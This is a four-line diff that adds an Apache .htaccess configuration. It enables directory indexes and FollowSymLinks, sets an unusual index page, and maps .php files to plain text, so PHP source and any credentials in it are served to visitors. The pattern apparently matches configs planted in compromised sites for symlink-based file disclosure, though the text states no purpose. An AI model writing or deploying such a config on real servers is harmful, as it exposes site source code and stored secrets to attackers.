@@ -1,0 +1,4 @@
+Options Indexes FollowSymLinks
+DirectoryIndex underfamily.html
+AddType txt .php
+AddHandler txt .php
